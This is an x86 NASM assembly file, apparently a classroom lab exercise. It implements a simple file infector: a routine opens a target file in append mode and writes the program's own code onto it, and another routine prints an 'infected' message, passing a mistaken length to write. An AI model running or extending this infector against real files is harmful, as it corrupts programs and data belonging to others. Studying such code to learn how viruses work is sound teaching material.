section .data
    APPEND EQU 1025
    CREATE EQU 64
    CLOSE EQU 6
    READONLY EQU 0
    WRITEONLY EQU 1
    OPEN EQU 5
    WRITE EQU 4
    READ EQU 3
    STDOUT EQU 1
    STDIN EQU 0
    msg: db "Hello,Infected File",10,0

section .text
global _start
global system_call
global infection
global infector
extern main, strlen
code_start:


_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    pushad

    ;calc len
    mov     esi, dword [msg]
    push    dword msg
    call    strlen

    mov     edx, ebp
    mov     eax, WRITE
    mov     ebx, STDOUT
    mov     ecx, msg
    int     0x80


    mov     esp, ebp
    pop     ebp
    ret


infector:
    push    ebp             ; Save caller state
    mov     ebp, esp

    ;open
    mov     eax, OPEN
    mov     ebx, [ebp+8]
    mov     ecx, APPEND
    mov     edx, 0777
    int     0x80

    push    eax
    ;mov     esi, eax       ;file descriptor in esi

    ;infect
    mov     ebx, eax
    mov     eax, WRITE
    mov     ecx, code_start
    mov     edx, code_end - code_start
    int     0x80

    ;close
    mov     eax, CLOSE
    pop     ebx
    int     0x80

    mov     esp, ebp
    pop     ebp
    ret




code_end: